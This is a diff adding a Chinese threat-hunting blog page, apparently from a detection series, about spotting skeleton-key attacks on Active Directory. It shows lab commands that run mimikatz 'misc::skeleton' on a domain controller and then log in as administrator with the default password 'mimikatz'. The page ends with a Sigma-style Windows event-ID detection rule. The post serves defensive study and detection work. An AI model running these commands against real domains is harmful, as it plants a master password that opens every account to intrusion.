@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+  <head>
+    
+
+    
+<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
+    
+
+<meta charset="utf-8" >
+
+<title>监控万能密码攻击行为</title>
+<meta name="keywords" content="监控万能密码攻击行为, 0x783kb,threathunting">
+<meta name="description" content="简述帐户操作可以帮助攻击者维持在环境中对凭据和某些权限级别的访问。账户操作可能包括修改权限，修改凭据，添加或更改权限组，修改帐户设置或修改执行身份验证等方式。为了创建或操纵帐户，攻击者必须已经对系统或域具有足够的权限。
+测试案例使用万能密码">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta property="og:title" content="监控万能密码攻击行为">
+<meta property="og:description" content="简述帐户操作可以帮助攻击者维持在环境中对凭据和某些权限级别的访问。账户操作可能包括修改权限，修改凭据，添加或更改权限组，修改帐户设置或修改执行身份验证等方式。为了创建或操纵帐户，攻击者必须已经对系统或域具有足够的权限。
+测试案例使用万能密码">
+
+<link rel="shortcut icon" href="/images1/avatar.ico">
+<link rel="stylesheet" href="/style/main.css">
+
+  <meta name="generator" content="Hexo 7.1.1"></head>
+  <body>
+    <div id="app" class="main">
+
+<div class="site-header-container">
+  <div class="site-header">
+    <div class="left">
+      <a href="http://example.com">
+        <img class="avatar" src="/images1/avatar.ico" alt="logo" width="32px" height="32px">
+      </a>
+      <a href="http://example.com">
+        <h1 class="site-title">0x783kb</h1>
+      </a>
+    </div>
+    <div class="right">
+        <i class="icon menu-switch icon-menu-outline" ></i>
+    </div>
+  </div>
+</div>
+
+<div class="menu-container" style="height: 0;opacity: 0;">
+<nav class="menu-list">
+  
+    
+      <a href="/" class="menu purple-link">
+        首页
+      </a>
+    
+  
+    
+      <a href="/tags/" class="menu purple-link">
+        标签
+      </a>
+    
+  
+    
+      <a href="/archives/" class="menu purple-link">
+        归档
+      </a>
+    
+  
+    
+      <a href="/about" class="menu purple-link">
+        关于
+      </a>
+    
+  
+</nav>
+</div>
+
+
+
+  <div class="content-container">
+    <div class="post-detail">
+      
+      <h2 class="post-title">监控万能密码攻击行为</h2>
+      <div class="post-info post-detail-info">
+        <span><i class="icon icon-calendar-outline"></i> 2020-04-15</span>
+        
+          <span>
+          <i class="icon icon-pricetags-outline"></i>
+            
+              <a href="/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/">
+              日志分析
+                
+                  ，
+                
+              </a>
+            
+              <a href="/tags/ATT-CK/">
+              ATT&amp;CK
+                
+              </a>
+            
+          </span>
+        
+      </div>
+      <div class="post-content-wrapper">
+        <div class="post-content">
+          <h2 id="简述"><a href="#简述" class="headerlink" title="简述"></a>简述</h2><p>帐户操作可以帮助攻击者维持在环境中对凭据和某些权限级别的访问。账户操作可能包括修改权限，修改凭据，添加或更改权限组，修改帐户设置或修改执行身份验证等方式。为了创建或操纵帐户，攻击者必须已经对系统或域具有足够的权限。</p>
+<h2 id="测试案例"><a href="#测试案例" class="headerlink" title="测试案例"></a>测试案例</h2><p>使用万能密码（skeleton key），可以对域内权限进行持久化操作。</p>
+<h2 id="检测日志"><a href="#检测日志" class="headerlink" title="检测日志"></a>检测日志</h2><p>windows 安全日志</p>
+<h2 id="测试复现"><a href="#测试复现" class="headerlink" title="测试复现"></a>测试复现</h2><h3 id="步骤1（PC上执行，普通域用户权限）"><a href="#步骤1（PC上执行，普通域用户权限）" class="headerlink" title="步骤1（PC上执行，普通域用户权限）"></a>步骤1（PC上执行，普通域用户权限）</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">dir</span> \\<span class="title">dc.xiaomi.org</span>\<span class="title">c</span>$  </span></span><br><span class="line"><span class="function">拒绝访问。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">net</span> <span class="title">use</span> \\<span class="title">dc.xiaomi.org</span>\<span class="title">ipc</span>$ &quot;<span class="title">admin</span>.098&quot; /<span class="title">user:xiaomi</span>\<span class="title">administra</span></span></span><br><span class="line"><span class="function"><span class="title">tor</span></span></span><br><span class="line"><span class="function">命令成功完成。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">dir</span> \\<span class="title">dc.xiaomi.org</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"> 驱动器 \\<span class="title">dc.xiaomi.org</span>\<span class="title">c</span>$ 中的卷没有标签。</span></span><br><span class="line"><span class="function"> 卷的序列号是 50<span class="title">E9</span>-7<span class="title">D0C</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">dc.xiaomi.org</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/03/23  15:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/03/23  15:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/03/23  14:47    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/03/23  15:30    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br><span class="line"><span class="function">               0 个文件              0 字节</span></span><br><span class="line"><span class="function">               5 个目录 32,728,838,144 可用字节</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">net</span> <span class="title">use</span></span></span><br><span class="line"><span class="function">会记录新的网络连接。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">状态       本地        远程                      网络</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">OK</span>                     \\<span class="title">dc.xiaomi.org</span>\<span class="title">ipc</span>$      <span class="title">Microsoft</span> <span class="title">Windows</span> <span class="title">Network</span></span></span><br><span class="line"><span class="function">命令成功完成。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">net</span> <span class="title">use</span> \\<span class="title">dc.xiaomi.org</span>\<span class="title">ipc</span>$ /<span class="title">del</span> /<span class="title">y</span></span></span><br><span class="line"><span class="function">\\<span class="title">dc.xiaomi.org</span>\<span class="title">ipc</span>$ 已经删除。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">net</span> <span class="title">use</span></span></span><br><span class="line"><span class="function">会记录新的网络连接。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">列表是空的。</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="步骤2（DC上执行，管理员权限）"><a href="#步骤2（DC上执行，管理员权限）" class="headerlink" title="步骤2（DC上执行，管理员权限）"></a>步骤2（DC上执行，管理员权限）</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Administrator</span>\<span class="title">Desktop</span>\<span class="title">mimikatz_trunk</span>\<span class="title">x64</span>&gt;<span class="title">mimikatz.exe</span> &quot;<span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function">&quot; &quot;<span class="title">misc</span>::<span class="title">skeleton</span>&quot; <span class="title">exit</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  .#####.   <span class="title">mimikatz</span> 2.1.1 (<span class="title">x64</span>) <span class="title">built</span> <span class="title">on</span> <span class="title">Apr</span>  9 2017 23:24:20</span></span><br><span class="line"><span class="function"> .## ^ ##.  &quot;<span class="title">A</span> <span class="title">La</span> <span class="title">Vie</span>, <span class="title">A</span> <span class="title">L</span>&#x27;<span class="title">Amour</span>&quot;</span></span><br><span class="line"><span class="function"> ## / \ ##  /* * *</span></span><br><span class="line"><span class="function"> ## \ / ##   <span class="title">Benjamin</span> <span class="title">DELPY</span> `<span class="title">gentilkiwi</span>` ( <span class="title">benjamin</span>@<span class="title">gentilkiwi.com</span> )</span></span><br><span class="line"><span class="function"> &#x27;## <span class="title">v</span> ##&#x27;   <span class="title">http</span>://<span class="title">blog.gentilkiwi.com</span>/<span class="title">mimikatz</span>             (<span class="title">oe.eo</span>)</span></span><br><span class="line"><span class="function">  &#x27;#####&#x27;                                     <span class="title">with</span> 21 <span class="title">modules</span> * * */</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">privilege</span>::<span class="title">debug</span></span></span><br><span class="line"><span class="function"><span class="title">Privilege</span> &#x27;20&#x27; <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">misc</span>::<span class="title">skeleton</span></span></span><br><span class="line"><span class="function">[<span class="title">KDC</span>] <span class="title">data</span></span></span><br><span class="line"><span class="function">[<span class="title">KDC</span>] <span class="title">struct</span></span></span><br><span class="line"><span class="function">[<span class="title">KDC</span>] <span class="title">keys</span> <span class="title">patch</span> <span class="title">OK</span></span></span><br><span class="line"><span class="function">[<span class="title">RC4</span>] <span class="title">functions</span></span></span><br><span class="line"><span class="function">[<span class="title">RC4</span>] <span class="title">init</span> <span class="title">patch</span> <span class="title">OK</span></span></span><br><span class="line"><span class="function">[<span class="title">RC4</span>] <span class="title">decrypt</span> <span class="title">patch</span> <span class="title">OK</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">mimikatz</span>(<span class="title">commandline</span>) # <span class="title">exit</span></span></span><br><span class="line"><span class="function"><span class="title">Bye</span>!</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>系统提示Skeleton Key已经注入成功。此时，会在域内的所有账户中添加一个Skeleton key，其密码默认为“mimikatz”。接下来可以以域内任何用户的身份，配合该Skeleton Key，进行域内身份授权验证了。</strong></p>
+<h3 id="步骤3（PC上执行，普通域用户权限）"><a href="#步骤3（PC上执行，普通域用户权限）" class="headerlink" title="步骤3（PC上执行，普通域用户权限）"></a>步骤3（PC上执行，普通域用户权限）</h3><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">net</span> <span class="title">use</span> \\<span class="title">dc.xiaomi.org</span>\<span class="title">ipc</span>$ &quot;<span class="title">mimikatz</span>&quot; /<span class="title">user:xiaomi</span>\<span class="title">administrat</span></span></span><br><span class="line"><span class="function"><span class="title">or</span></span></span><br><span class="line"><span class="function">命令成功完成。</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\<span class="title">Users</span>\<span class="title">xiaomi</span>&gt;<span class="title">dir</span> \\<span class="title">dc.xiaomi.org</span>\<span class="title">c</span>$</span></span><br><span class="line"><span class="function"> 驱动器 \\<span class="title">dc.xiaomi.org</span>\<span class="title">c</span>$ 中的卷没有标签。</span></span><br><span class="line"><span class="function"> 卷的序列号是 50<span class="title">E9</span>-7<span class="title">D0C</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"> \\<span class="title">dc.xiaomi.org</span>\<span class="title">c</span>$ 的目录</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">2009/07/14  11:20    &lt;<span class="title">DIR</span>&gt;          <span class="title">PerfLogs</span></span></span><br><span class="line"><span class="function">2020/03/23  15:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span></span></span><br><span class="line"><span class="function">2020/03/23  15:24    &lt;<span class="title">DIR</span>&gt;          <span class="title">Program</span> <span class="title">Files</span> (<span class="title">x86</span>)</span></span><br><span class="line"><span class="function">2020/03/23  14:47    &lt;<span class="title">DIR</span>&gt;          <span class="title">Users</span></span></span><br><span class="line"><span class="function">2020/03/23  15:30    &lt;<span class="title">DIR</span>&gt;          <span class="title">Windows</span></span></span><br><span class="line"><span class="function">               0 个文件              0 字节</span></span><br><span class="line"><span class="function">               5 个目录 32,758,198,272 可用字节</span></span><br><span class="line"><span class="function"></span></span><br></pre></td></tr></table></figure>
+
+<h2 id="测试留痕"><a href="#测试留痕" class="headerlink" title="测试留痕"></a>测试留痕</h2><p>windows安全事件ID，多事件关联分析</p>
+<h2 id="检测规则-思路"><a href="#检测规则-思路" class="headerlink" title="检测规则&#x2F;思路"></a>检测规则&#x2F;思路</h2><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">title:</span> <span class="string">Windows</span> <span class="string">万能密码</span></span><br><span class="line"><span class="attr">description:</span> <span class="string">Windows</span> <span class="string">server</span> <span class="number">2008 </span><span class="string">R2\win</span> <span class="number">7</span></span><br><span class="line"><span class="attr">references:</span> <span class="string">https://0xsp.com/ad-attack-or-defense/ad-ttps-list</span></span><br><span class="line"><span class="attr">tags:</span> <span class="string">T1098</span></span><br><span class="line"><span class="attr">status:</span> <span class="string">experimental</span></span><br><span class="line"><span class="attr">author:</span> <span class="string">12306Bro</span></span><br><span class="line"><span class="attr">logsource:</span></span><br><span class="line">    <span class="attr">product:</span> <span class="string">windows</span></span><br><span class="line">    <span class="attr">service:</span> <span class="string">security</span></span><br><span class="line"><span class="attr">detection:</span></span><br><span class="line">    <span class="attr">selection1:</span></span><br><span class="line">        <span class="attr">EventID:</span> <span class="number">4673</span>  <span class="comment">#调用权限的服务</span></span><br><span class="line">    <span class="attr">selection2:</span></span><br><span class="line">        <span class="attr">EventID:</span> <span class="number">4611</span>  <span class="comment">#受信任的登录进程已在本地安全机构注册</span></span><br><span class="line">    <span class="attr">selection3:</span></span><br><span class="line">        <span class="attr">EventID:</span> <span class="number">4688</span>  <span class="comment">#新进程创建</span></span><br><span class="line">    <span class="attr">selection4:</span></span><br><span class="line">        <span class="attr">EventID:</span> <span class="number">4689</span>  <span class="comment">#退出进程</span></span><br><span class="line">    <span class="attr">timeframe:</span> <span class="string">last</span> <span class="string">5s</span></span><br><span class="line">    <span class="attr">condition:</span> <span class="string">all</span> <span class="string">of</span> <span class="string">them</span></span><br><span class="line"><span class="attr">level:</span> <span class="string">medium</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="参考推荐"><a href="#参考推荐" class="headerlink" title="参考推荐"></a>参考推荐</h2><p>MITRE-ATT&amp;CK-T1098：<a target="_blank" rel="noopener" href="https://attack.mitre.org/techniques/T1098/">https://attack.mitre.org/techniques/T1098/</a></p>
+<p>域渗透——Skeleton Key – 三好学生：<a target="_blank" rel="noopener" href="http://www.vuln.cn/6816">http://www.vuln.cn/6816</a></p>
+
+        </div>
+          
+        <div class="top-div">
+          <ol class="top-box"><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E7%AE%80%E8%BF%B0"><span class="top-box-text">简述</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E6%B5%8B%E8%AF%95%E6%A1%88%E4%BE%8B"><span class="top-box-text">测试案例</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E6%A3%80%E6%B5%8B%E6%97%A5%E5%BF%97"><span class="top-box-text">检测日志</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E6%B5%8B%E8%AF%95%E5%A4%8D%E7%8E%B0"><span class="top-box-text">测试复现</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%AD%A5%E9%AA%A41%EF%BC%88PC%E4%B8%8A%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%EF%BC%89"><span class="top-box-text">步骤1（PC上执行，普通域用户权限）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%AD%A5%E9%AA%A42%EF%BC%88DC%E4%B8%8A%E6%89%A7%E8%A1%8C%EF%BC%8C%E7%AE%A1%E7%90%86%E5%91%98%E6%9D%83%E9%99%90%EF%BC%89"><span class="top-box-text">步骤2（DC上执行，管理员权限）</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#%E6%AD%A5%E9%AA%A43%EF%BC%88PC%E4%B8%8A%E6%89%A7%E8%A1%8C%EF%BC%8C%E6%99%AE%E9%80%9A%E5%9F%9F%E7%94%A8%E6%88%B7%E6%9D%83%E9%99%90%EF%BC%89"><span class="top-box-text">步骤3（PC上执行，普通域用户权限）</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E6%B5%8B%E8%AF%95%E7%95%99%E7%97%95"><span class="top-box-text">测试留痕</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E6%A3%80%E6%B5%8B%E8%A7%84%E5%88%99-%E6%80%9D%E8%B7%AF"><span class="top-box-text">检测规则&#x2F;思路</span></a></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%8F%82%E8%80%83%E6%8E%A8%E8%8D%90"><span class="top-box-text">参考推荐</span></a></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2020/04/12/Threathunting-AdminSDHolder/">
+          <h3 class="post-title">
+            下一篇：检测AdminSDHolder攻击
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/0x783kb" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"photo_zoom":"simple-lightbox"}}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  </body>
+</html>
+
